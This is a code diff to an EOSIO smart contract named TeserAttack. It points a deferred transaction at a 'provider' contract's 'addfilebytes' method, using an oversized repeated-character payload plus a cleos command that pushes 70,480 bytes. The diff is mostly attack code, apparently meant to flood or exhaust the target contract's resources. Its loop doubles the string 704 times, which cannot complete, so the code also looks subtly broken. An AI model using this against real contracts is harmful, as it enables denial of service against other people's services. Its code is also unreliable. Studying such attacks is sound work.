@@ -22,12 +22,21 @@ class [[eosio::contract]] TeserAttack : public eosio::contract {
             int N = 1; // N division
 
             /////////////// TARGET CONTRACT METHOD ARGUMENT //////////
-            name targetContract = _self;
-            name targetMethod = name("main");
+            // cleos push action provider addfilebytes "[8,`python -c 'print \"B\"*70480'`,70480]" -p client@active
+            //////////////////////////////////////////////////////////////
+            name targetContract = "provider"_n;
+            name targetMethod = name("addfilebytes");
+            std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+            for ( int i = 0; i < 704; i++)
+            {
+                A = A+ A;
+            }
             auto argu = std::make_tuple(
-                    client, 
-                    uint64_t(idx)
+                    uint64_t(idx),
+                    A, 
+                    uint64_t(70480)
                     );
+
             target.actions.emplace_back(permission_level{ client , "active"_n}, targetContract,  targetMethod, argu);
             target.send(idx, client, false);
 
